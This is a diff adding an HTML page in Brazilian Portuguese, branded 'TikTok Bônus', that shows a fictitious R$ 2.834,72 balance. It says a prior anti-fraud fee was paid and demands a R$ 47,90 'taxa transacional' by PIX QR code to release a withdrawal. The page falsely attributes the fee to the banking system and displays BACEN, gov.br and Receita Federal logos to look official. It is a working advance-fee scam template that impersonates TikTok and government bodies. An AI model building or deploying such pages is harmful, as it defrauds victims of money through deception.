@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taxa Transacional - TikTok Bônus</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../assets/icons/image.png">
+
+    <!-- TikTok Sans Font -->
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+    <style>
+      @font-face {
+        font-family: 'TikTok Sans';
+        font-style: normal;
+        font-display: swap;
+        font-weight: 300 900;
+        src: url('../assets/fonts/tiktok-sans.woff2') format('woff2-variations');
+      }
+    </style>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../assets/css/index-B1D6e1Fy.css">
+
+    <style>
+      /* Animações */
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .animate-fade-in-up {
+        animation: fadeInUp 0.4s ease-out forwards;
+      }
+
+      /* Estilos do Modal PIX */
+      #pixModal {
+        animation: fadeIn 0.3s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      #pixModal .bg-white {
+        animation: slideUp 0.3s ease-out;
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .line-clamp-2 {
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+        overflow: hidden;
+      }
+
+      /* Spinner Animation */
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .animate-spin {
+        animation: spin 1s linear infinite;
+      }
+
+      /* Animações de Confirmação */
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .fade-in-up {
+        animation: fadeInUp 0.5s ease-out forwards;
+      }
+
+      .fade-in {
+        animation: fadeIn 0.5s ease-out forwards;
+      }
+    </style>
+</head>
+<body>
+    <div class="min-h-screen bg-background">
+        <!-- Header -->
+        <header class="bg-background sticky top-0 z-10 py-3 border-b border-border">
+            <h1 class="text-center text-foreground font-semibold text-lg">TikTok Bônus</h1>
+        </header>
+
+        <!-- Container Principal -->
+        <div class="px-4 py-4 space-y-4 max-w-md mx-auto">
+
+            <!-- Card Saldo -->
+            <div class="bg-card rounded-2xl p-4 shadow-sm animate-fade-in-up">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-muted-foreground text-sm">Seu saldo</p>
+                        <h2 class="text-foreground text-2xl font-bold mt-0.5 balance-display">R$ 2.834,72</h2>
+                    </div>
+                    <button id="withdrawBtn" class="bg-primary hover:bg-primary/90 text-primary-foreground font-semibold px-6 py-2.5 rounded-full text-sm transition-colors">
+                        Sacar
+                    </button>
+                </div>
+            </div>
+
+            <!-- Card Validação Confirmada -->
+            <div class="bg-emerald-50 border border-emerald-200 rounded-2xl p-4 animate-fade-in-up">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-emerald-100 rounded-full flex items-center justify-center flex-shrink-0">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-600">
+                            <path d="M20 6 9 17l-5-5"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <p class="text-emerald-700 font-semibold text-sm">Validação confirmada!</p>
+                        <p class="text-emerald-600 text-xs">Taxa anti-fraude reembolsada</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card Taxa Transacional -->
+            <div class="bg-card rounded-2xl p-5 shadow-sm animate-fade-in-up">
+                <div class="flex items-start gap-3 mb-4">
+                    <div class="w-10 h-10 bg-orange-100 rounded-full flex items-center justify-center flex-shrink-0">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-orange-500">
+                            <line x1="12" y1="2" x2="12" y2="22"></line>
+                            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-foreground font-bold text-base">Taxa Transacional</h3>
+                        <p class="text-muted-foreground text-sm mt-1">Última etapa para liberar seu saque</p>
+                    </div>
+                </div>
+
+                <div class="bg-orange-50 rounded-xl p-4 mb-4">
+                    <div class="flex items-center justify-between">
+                        <span class="text-muted-foreground text-sm">Valor da taxa:</span>
+                        <span class="text-orange-600 text-xl font-bold transaction-fee-display">R$ 47,90</span>
+                    </div>
+                </div>
+
+                <p class="text-muted-foreground text-sm leading-relaxed">
+                    Esta taxa é exigida pelo sistema bancário para processar transferências PIX acima de R$ 1.000. Após o pagamento, você receberá <span class="font-semibold text-foreground balance-display">R$ 2.834,72</span> instantaneamente.
+                </p>
+            </div>
+
+            <!-- Card Etapas do Processo -->
+            <div class="bg-card rounded-2xl p-5 shadow-sm animate-fade-in-up">
+                <p class="text-muted-foreground text-xs font-semibold uppercase tracking-wide mb-4">Etapas do processo</p>
+                <div class="space-y-4">
+                    <!-- Etapa 1: Concluída -->
+                    <div class="flex items-start gap-3">
+                        <div class="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 bg-emerald-100">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-500">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <div class="flex-1 pt-0.5">
+                            <h4 class="font-semibold text-sm text-emerald-600">Confirmação de identidade</h4>
+                            <p class="text-muted-foreground text-xs mt-0.5">Verificação concluída</p>
+                        </div>
+                        <span class="text-emerald-500 text-xs font-medium bg-emerald-50 px-2 py-1 rounded-full">Concluído</span>
+                    </div>
+
+                    <!-- Etapa 2: Concluída -->
+                    <div class="flex items-start gap-3">
+                        <div class="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 bg-emerald-100">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-500">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <div class="flex-1 pt-0.5">
+                            <h4 class="font-semibold text-sm text-emerald-600">Validação de segurança</h4>
+                            <p class="text-muted-foreground text-xs mt-0.5">Taxa anti-fraude paga</p>
+                        </div>
+                        <span class="text-emerald-500 text-xs font-medium bg-emerald-50 px-2 py-1 rounded-full">Concluído</span>
+                    </div>
+
+                    <!-- Etapa 3: Atual (Taxa Transacional) -->
+                    <div class="flex items-start gap-3">
+                        <div class="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 bg-orange-100">
+                            <span class="font-semibold text-sm text-orange-600">3</span>
+                        </div>
+                        <div class="flex-1 pt-0.5">
+                            <h4 class="font-semibold text-sm text-orange-600">Pagar taxa transacional</h4>
+                            <p class="text-muted-foreground text-xs mt-0.5">R$ 47,90 para liberação do saque</p>
+                        </div>
+                    </div>
+
+                    <!-- Etapa 4: Pendente -->
+                    <div class="flex items-start gap-3">
+                        <div class="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 bg-muted">
+                            <span class="font-semibold text-sm text-muted-foreground">4</span>
+                        </div>
+                        <div class="flex-1 pt-0.5">
+                            <h4 class="font-semibold text-sm text-foreground">Saque liberado</h4>
+                            <p class="text-muted-foreground text-xs mt-0.5 balance-display">R$ 2.834,72 disponível para transferência</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card Dados para Transferência -->
+            <div class="bg-card rounded-2xl p-5 shadow-sm animate-fade-in-up">
+                <p class="text-muted-foreground text-xs font-semibold uppercase tracking-wide mb-4">Dados para transferência</p>
+                <div class="space-y-3">
+                    <div class="flex justify-between py-2 border-b border-border">
+                        <span class="text-muted-foreground text-sm">Beneficiário</span>
+                        <span class="text-foreground font-medium text-sm user-name">Não informado</span>
+                    </div>
+                    <div class="flex justify-between py-2 border-b border-border">
+                        <span class="text-muted-foreground text-sm">Chave PIX</span>
+                        <span class="text-foreground font-medium text-sm pix-key-type">Não informado</span>
+                    </div>
+                    <div class="flex justify-between py-2">
+                        <span class="text-muted-foreground text-sm">Valor a receber</span>
+                        <span class="text-emerald-600 font-bold text-sm balance-display">R$ 2.834,72</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botão Pagar Taxa -->
+            <div class="pt-2 pb-4 animate-fade-in-up">
+                <button id="payTransactionFeeBtn" class="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-4 rounded-2xl transition-colors text-base shadow-lg shadow-primary/25">
+                    Pagar Taxa e Liberar Saque
+                </button>
+                <div class="flex items-center justify-center gap-2 mt-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-500">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                    <span class="text-emerald-600 text-sm font-medium">Transferência instantânea após pagamento</span>
+                </div>
+            </div>
+
+            <!-- Logos -->
+            <div class="flex items-center justify-center gap-6 py-4 border-t border-border animate-fade-in-up">
+                <img src="../assets/icons/bacen-logo-XOo1vtRL.png" alt="BACEN" class="h-10 object-contain opacity-60">
+                <img src="../assets/icons/gov-br-logo-32QelNif.webp" alt="gov.br" class="h-7 object-contain opacity-60">
+                <img src="../assets/icons/receita-federal-logo-CMD7EUle.png" alt="Receita Federal" class="h-10 object-contain opacity-60">
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Modal QR Code PIX (mesmo da confirmação) -->
+    <div id="pixModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl" style="opacity: 1; transform: none;">
+            <!-- Header do Modal -->
+            <div class="bg-[#1a1a1a] px-5 py-4 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#00D4AA] rounded-full flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-qr-code w-5 h-5 text-white">
+                            <rect width="5" height="5" x="3" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="16" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="3" y="16" rx="1"></rect>
+                            <path d="M21 16h-3a2 2 0 0 0-2 2v3"></path>
+                            <path d="M21 21v.01"></path>
+                            <path d="M12 7v3a2 2 0 0 1-2 2H7"></path>
+                            <path d="M3 12h.01"></path>
+                            <path d="M12 3h.01"></path>
+                            <path d="M12 16v.01"></path>
+                            <path d="M16 12h1"></path>
+                            <path d="M21 12v.01"></path>
+                            <path d="M12 21v-1"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold">Pagamento PIX</h3>
+                        <p class="text-white/60 text-sm" id="modalAmount">R$ 47,90</p>
+                    </div>
+                </div>
+                <button id="closeModalBtn" class="text-white/60 hover:text-white transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x w-6 h-6">
+                        <path d="M18 6 6 18"></path>
+                        <path d="m6 6 12 12"></path>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Conteúdo do Modal -->
+            <div class="p-5">
+                <!-- Estado: Loading -->
+                <div id="pixLoadingState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <svg class="w-12 h-12 text-[#E94560] animate-spin mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <p class="text-gray-600">Gerando QR Code PIX...</p>
+                </div>
+
+                <!-- Estado: Erro -->
+                <div id="pixErrorState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-500">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                    <p class="text-red-600 font-medium mb-2">Erro ao gerar PIX</p>
+                    <p id="errorMessage" class="text-gray-500 text-sm text-center mb-4"></p>
+                    <button id="retryPixBtn" class="bg-[#E94560] text-white px-6 py-2 rounded-lg font-medium hover:bg-[#d63d56] transition-colors">
+                        Tentar novamente
+                    </button>
+                </div>
+
+                <!-- Estado: Pagamento Confirmado -->
+                <div id="pixConfirmedState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div id="confirmedTitle" class="text-emerald-600 font-bold text-xl mb-2" style="opacity: 0; transform: translateY(10px);">
+                        Pagamento Confirmado!
+                    </div>
+                    <div id="confirmedSubtitle" class="text-gray-500 text-sm" style="opacity: 0;">
+                        Redirecionando...
+                    </div>
+                    <div id="confirmedSpinner" class="mt-4" style="opacity: 0;">
+                        <svg class="w-6 h-6 text-emerald-500 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Estado: Sucesso (QR Code) -->
+                <div id="pixSuccessState" class="hidden">
+                    <div class="flex justify-center mb-6">
+                        <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-56 h-56 rounded-lg border-2 border-gray-100">
+                    </div>
+                    <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                        <p class="text-gray-700 text-sm font-medium mb-2">Como pagar:</p>
+                        <ol class="text-gray-600 text-sm space-y-1">
+                            <li>1. Abra o app do seu banco</li>
+                            <li>2. Escolha pagar via PIX</li>
+                            <li>3. Escaneie o QR Code ou copie o código</li>
+                        </ol>
+                    </div>
+                    <div class="mb-4">
+                        <p class="text-gray-500 text-xs font-semibold uppercase tracking-wide mb-2">PIX COPIA E COLA</p>
+                        <div class="relative">
+                            <div class="bg-gray-100 rounded-lg p-3 pr-12 overflow-hidden">
+                                <p id="pixCode" class="text-gray-700 text-xs font-mono break-all line-clamp-2"></p>
+                            </div>
+                            <button id="copyPixBtn" class="absolute right-2 top-1/2 -translate-y-1/2 p-2 bg-[#E94560] rounded-lg text-white hover:bg-[#d63d56] transition-colors">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy w-4 h-4">
+                                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="flex items-center justify-center gap-2 text-gray-500 text-sm">
+                        <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+                        <span>Aguardando pagamento...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../assets/js/config.js"></script>
+    <script src="../assets/js/url-rewrite.js"></script>
+    <script src="../assets/js/taxa-transacional.js"></script>
+</body>
+</html>
+
